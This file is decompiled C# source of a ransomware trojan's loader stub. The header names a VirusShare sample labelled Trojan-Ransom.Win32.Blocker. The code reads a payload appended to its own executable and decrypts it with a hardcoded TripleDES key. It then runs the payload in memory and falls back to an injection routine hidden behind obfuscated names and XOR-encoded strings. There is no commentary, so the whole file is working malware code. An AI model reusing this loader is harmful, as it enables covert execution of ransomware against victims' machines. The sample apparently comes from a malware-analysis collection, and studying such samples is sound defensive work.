// Decompiled with JetBrains decompiler
// Type: Protector.Module1
// Assembly: Protector, Version=1.2.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7FF4FED0-1C4E-4B7A-A92B-FD867F108819
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.Win32.Blocker.hfey-7f35fb498d01d9440519676ef3fbadb46e3b0dae.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Protector
{
  [StandardModule]
  internal sealed class Module1
  {
    private const string lPwLHMgSLRRbfcjmWeJgmdZ = "D4S4INT";
    private static string[] mFHkWNaFiNwHrqptRXpMgkb = Strings.Split(File.ReadAllText(Application.ExecutablePath), "D4S4INT");
    private static byte[] dkPsrKcYmdamiQotlvTUFEZ = Module1.hdfghdgdf(Convert.FromBase64String(Module1.mFHkWNaFiNwHrqptRXpMgkb[1]));
    private static object fhgdjfkhgkjdg = (object) RuntimeEnvironment.GetRuntimeDirectory();

    public static void PtYpoHvYdiqoGkmtXhYqWDh(byte[] jfkghkjfhgkd)
    {
      try
      {
        Thread thread = new Thread((ParameterizedThreadStart) (a0 => Module1.wBXusJhKEjjtSiiCfejNKNB(RuntimeHelpers.GetObjectValue(a0))));
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start((object) jfkghkjfhgkd);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [STAThread]
    public static void Main()
    {
      Encoding.GetEncoding(1252).GetBytes(Module1.mFHkWNaFiNwHrqptRXpMgkb[1]);
      try
      {
        Assembly.Load(Module1.dkPsrKcYmdamiQotlvTUFEZ);
        Module1.PtYpoHvYdiqoGkmtXhYqWDh(Module1.dkPsrKcYmdamiQotlvTUFEZ);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Amtheone.LvpTApnaJnJKmdVmtUbuPql(Module1.dkPsrKcYmdamiQotlvTUFEZ, Conversions.ToString(Operators.ConcatenateObject(Module1.fhgdjfkhgkjdg, Module1.tgASAFBAhvmHgoPhwBkXbrq(",89t?\"?", "ZAkjrcCUeHvQZrPnEBZNmKF"))));
        ProjectData.ClearProjectError();
      }
    }

    public static object wBXusJhKEjjtSiiCfejNKNB(object fjgljdflkgjdfg)
    {
      try
      {
        MethodInfo entryPoint = Assembly.Load((byte[]) fjgljdflkgjdfg).EntryPoint;
        if (entryPoint.GetParameters().Length == 1)
          entryPoint.Invoke((object) null, new object[1]
          {
            (object) new string[0]
          });
        else
          entryPoint.Invoke((object) null, (object[]) null);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      object obj;
      return obj;
    }

    public static byte[] hdfghdgdf(byte[] fthtuyj)
    {
      using (TripleDESCryptoServiceProvider cryptoServiceProvider = new TripleDESCryptoServiceProvider())
      {
        cryptoServiceProvider.IV = new byte[8]
        {
          (byte) 19,
          (byte) 15,
          (byte) 67,
          (byte) 52,
          (byte) 43,
          (byte) 13,
          (byte) 72,
          (byte) 11
        };
        cryptoServiceProvider.Key = new byte[24]
        {
          (byte) 12,
          (byte) 82,
          (byte) 33,
          (byte) 44,
          (byte) 75,
          (byte) 16,
          (byte) 97,
          (byte) 18,
          (byte) 19,
          (byte) 27,
          (byte) 26,
          (byte) 34,
          (byte) 15,
          (byte) 27,
          (byte) 24,
          (byte) 47,
          (byte) 32,
          (byte) 67,
          (byte) 52,
          (byte) 92,
          (byte) 41,
          (byte) 61,
          (byte) 23,
          (byte) 20
        };
        return cryptoServiceProvider.CreateDecryptor().TransformFinalBlock(fthtuyj, 0, fthtuyj.Length);
      }
    }

    private static object tgASAFBAhvmHgoPhwBkXbrq(
      string lgPhaDsobVSASfFuV,
      string oLKAJXpghOtYtMJjm)
    {
      string str = "";
      int num1 = Strings.Asc(oLKAJXpghOtYtMJjm);
      short num2 = checked ((short) Strings.Len(lgPhaDsobVSASfFuV));
      short Start = 1;
      while ((int) Start <= (int) num2)
      {
        str += Conversions.ToString(Strings.Chr(num1 ^ Strings.Asc(Strings.Mid(lgPhaDsobVSASfFuV, (int) Start, 1))));
        checked { ++Start; }
      }
      return (object) str;
    }
  }
}
